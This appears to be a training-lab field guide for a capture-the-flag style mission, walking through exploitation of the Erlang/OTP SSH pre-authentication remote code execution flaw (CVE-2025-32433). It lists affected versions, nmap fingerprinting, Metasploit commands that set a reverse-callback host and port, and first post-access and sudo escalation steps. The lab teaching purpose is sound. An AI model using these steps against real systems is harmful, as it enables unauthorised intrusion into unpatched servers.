---
title: SAFETYNET Field Guide - Erlang/OTP SSH RCE
layout: lab
description: Optional in-game guide for exploiting an Erlang/OTP SSH daemon for unauthenticated remote code execution
game_fragment: true
permalink: /labs/safetynet/erlang-otp-ssh-rce/
---

# SAFETYNET Field Guide: Erlang/OTP SSH RCE

## Objective

Use this guide when your scan of the training network turns up an SSH service on an unusual port, fingerprinted to the Erlang/OTP runtime rather than OpenSSH. The Erlang/OTP SSH library (CVE-2025-32433) handles certain protocol messages before authentication has finished, so anyone who can reach the port can run commands with no credentials. This is the way onto the box. Command execution as the service account is enough to start reading what that account can reach.

## Quick Reference

- The service is an SSH daemon, but it is **not** OpenSSH. It is built on the Erlang/OTP `ssh` application and often listens on a **non-standard high port**. A normal OpenSSH may sit on 22 beside it, so scan the full range.
- The flaw is pre-authentication: the daemon processes certain connection-protocol messages before anyone has authenticated. No username, password or key is needed.
- Affected runtimes: Erlang/OTP before OTP-27.3.3, OTP-26.2.5.11 and OTP-25.3.2.20.
- Metasploit module: `exploit/linux/ssh/ssh_erlangotp_rce`.
- You get command execution as the daemon's service user, which is unprivileged. That is enough for the first flag. Root is a separate step.

```bash
# Confirm the service and runtime from your scan
nmap -sV -p [ssh-port] [target-ip]

# Exploit with Metasploit
msfconsole
use exploit/linux/ssh/ssh_erlangotp_rce
set RHOSTS [target-ip]
set RPORT [ssh-port]
set LHOST [attacker-ip]
set LPORT [callback-port]
show options
exploit
```

Where:
- `[target-ip]` = the host running the Erlang/OTP SSH daemon
- `[ssh-port]` = the non-standard port your scan found the service on
- `[attacker-ip]` = your own machine, for the payload callback
- `[callback-port]` = a free local port for the listener

## Core Workflow

1. Scan the host and note every open port, not just 22. The odd high port is the candidate.
2. Fingerprint it with a version scan (`-sV`). An Erlang/OTP daemon reports a different software name and banner from OpenSSH. If the scan is ambiguous, a verbose client connection shows the same detail in the handshake strings.
3. Confirm the runtime. The flaw is a logic fault in message handling, not a memory bug, so there is no crash to probe for. Match the version against the affected ranges above. A runtime older than the patched releases is worth attacking.
4. Configure the module with the target host and port, then a payload whose `LHOST`/`LPORT` your target can reach.
5. Make sure your listener is reachable from the target, then run the exploit. No credentials are needed.
6. Confirm command execution as the service account, then read what that account can reach before you move on.

First commands after access:

```bash
id
hostname
# What can this account run, and what does it own?
sudo -l
ls -la ~
```

## Common Failure Modes

- **No session / no callback:** Recheck that the odd port is open from where you are, and that your `LHOST`/`LPORT` are reachable back from the target. A payload that cannot call home looks like a silent failure.
- **Module runs but nothing happens:** Confirm the runtime version is in the affected range. A patched OTP accepts the connection and does nothing exploitable.
- **Shell is unstable:** Prefer a simple command or shell payload over a heavier session type. The Erlang SSH channel is narrow.
- **Command runs but you cannot find what you need:** You have the service account's low-privilege context. Search the paths that account can read, starting with its own home, and do not assume root-only locations.

## Mission Application

Where a mission puts an odd-port SSH daemon in front of you and the version does not look like OpenSSH, it is the foothold the rest of the mission depends on. The shell you get belongs to an ordinary service account, so this is the start of the chain, not the end. Root comes from a separate escalation step, and in this mission that step runs through sudo, so start with what the service account is allowed to run. Read before you move, and submit each flag at the mission's terminal as you earn it.

---

*Adapted from the SAFETYNET field-guide style guide and the SSH-it-happens training scenario.*
